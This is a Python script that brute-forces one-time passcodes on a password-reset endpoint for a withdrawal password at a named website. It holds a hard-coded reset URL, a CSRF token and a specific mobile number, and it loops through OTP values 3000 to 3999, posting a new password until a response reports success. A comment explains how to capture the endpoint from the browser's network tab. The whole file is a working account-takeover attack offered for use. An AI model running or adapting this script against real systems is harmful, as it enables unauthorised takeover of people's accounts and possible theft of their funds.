import requests
import re

def forgot_password(mobile, otp, password, cnf_password):

#Change URL by inspecting the code or send dummy request and get url in network tab

  url = "https://88panel.com/withdraw-password-client/reset/863891/kUH4LkBdmJxbpBrHd3b0463a4d5cee4d1d7770e5653d8139"
  data = {
    "mobile": mobile,
    "otp": otp,
    "password": password,
    "password_confirmation": cnf_password,
    "_token": "j74yR2sZDRjhRmtL9unz8ZPSJlCFtVnXKtA1Wx8Y"
  }

  response = requests.post(url, data=data)

  if response.status_code == 200:
    if re.search(r"success", response.text):
        print("Password reset successful")
        return True
    else:
        print("Error:" , otp, response.text)
  else:
    print("Error:", response.status_code)
  return False


if __name__ == "__main__":
  # Example usage
  mobile = "8078644957"
  password = "QWERTY@12345!@#$%"
  cnf_password = "QWERTY@12345!@#$%"
  otp_range = range(3000, 4000)

  for otp in otp_range:
    try:
      if forgot_password(mobile, otp, password, cnf_password):
        break
    except Exception as e:
        print(f"Error for OTP {otp}: {e}")
